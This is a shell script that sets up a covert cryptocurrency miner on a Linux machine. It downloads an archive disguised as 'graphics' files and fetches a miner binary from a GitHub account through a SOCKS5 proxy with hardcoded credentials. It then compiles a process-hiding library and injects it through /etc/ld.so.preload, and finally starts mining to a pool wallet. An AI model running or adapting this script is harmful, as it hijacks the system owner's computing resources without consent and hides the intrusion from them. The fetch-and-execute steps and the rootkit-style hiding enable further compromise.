#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install unzip iftop cmake binutils build-essential screen net-tools curl nano cpuid neofetch automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev libnuma-dev

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 18.216.28.28:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/avx512-sha-vaes
chmod +x avx512-sha-vaes

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicAvx512-sha-vaes.zip

unzip magicAvx512-sha-vaes.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./avx512-sha-vaes -a gr -o stratum+tcps://na-rtm.pool-server.com:5555 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.PetrolAwAw -p IhatePopUps --no-tune
